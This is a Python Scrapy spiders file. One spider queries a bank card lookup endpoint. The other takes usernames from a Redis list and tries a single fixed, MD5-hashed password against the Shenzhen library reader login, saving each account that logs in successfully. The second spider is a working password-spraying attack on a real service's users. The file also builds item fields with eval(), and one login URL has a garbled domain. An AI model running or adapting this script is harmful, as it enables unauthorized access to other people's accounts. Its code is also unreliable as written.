# -*- coding: utf-8 -*-
import hashlib
import json

import scrapy
from scrapy import Request, FormRequest
import logging
import redis
from sandbox.items import SpiderItem
from sandbox import config


# get
class WebGetSpider(scrapy.Spider):
    name = 'website1'
    headers = {
        "Host": "cha.zfzj.cn",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://cha.zfzj.cn/mainPage.html",
    }
    URL = 'https://cha.zfzj.cn/bankCardDetail/select'

    def start_requests(self):
        # TO DO
        yield Request(url=self.URL)

    def parse(self, response):
        # logging.info(response.text)
        # logging.info('pass')
        ret_data = json.loads(response.body_as_unicode())

        spiderItem = SpiderItem()

        for field in spiderItem.fields:
            try:
                spiderItem[field] = eval(field)
            except Exception as e:
                logging.warning('can not find define of {}'.format(field))
                logging.warning(e)

        yield spiderItem


# post
class WebPostSpider(scrapy.Spider):
    name = 'website2'

    headers = {'Referer': 'https://www.szlib.org.cn/MyLibrary/Reader-Access.jsp?infomistake=0&eventsite=WWW-044005',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
               'X-Requested-With': 'XMLHttpRequest'}

    post_url = 'https://www.szlib.org.config/MyLibrary/readerLoginM.jsp'

    def start_requests(self):
        # TO DO
        URL = 'https://www.szlib.org.cn'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'}
        yield Request(url=URL, callback=self.query, headers=headers)

    def query(self, response):
        # TO DO
        rds = redis.StrictRedis('10.18.6.26', db=config.DB, decode_responses=True)

        # username = 'F44010006{}'
        password = config.password
        s = bytes(password, encoding='utf8')
        m = hashlib.md5()
        m.update(s)
        first_md5 = m.hexdigest()

        while 1:
            username = rds.lpop('username')
            if not username:
                break
            logging.info('query username >>>> {}'.format(username))
            data = {'rand': '',
                    'username': username,
                    'password': first_md5,
                    }
            yield FormRequest(url=self.post_url,
                              formdata=data,
                              headers=self.headers,
                              callback=self.parse,
                              meta={'username': username, 'password': password}
                              )

    def parse(self, response):
        # logging.info(response.text)
        # logging.info('pass')
        if '<message>OK</message>' in response.text:
            item = SpiderItem()
            item['username']=response.meta['username']
            item['password']=response.meta['password']
            yield item


